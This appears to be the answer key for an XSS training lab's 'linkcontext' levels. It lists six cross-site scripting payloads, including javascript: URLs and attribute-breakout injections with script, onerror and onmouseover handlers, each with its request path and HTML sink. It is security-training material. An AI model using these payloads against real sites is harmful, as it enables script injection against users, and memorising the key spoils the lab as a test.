# linkcontext — solutions

Reflections inside link-style URL/href attributes; many allow `javascript:` directly.

### linkcontext-level1

`/linkcontext/level1/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<a href="...">` URL sink

### linkcontext-level2

`/linkcontext/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<link rel=stylesheet href="...">` (not URL-triggered, break out of attribute)

### linkcontext-level3

`/linkcontext/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<a ping="...">` double-quoted attribute breakout

### linkcontext-level4

`/linkcontext/level4/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<area href="...">` inside imagemap, click-triggered

### linkcontext-level5

`/linkcontext/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: `<base href="...">`; javascript: base is ignored, so break out

### linkcontext-level6

`/linkcontext/level6/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: `<a title="...">` double-quoted attribute breakout
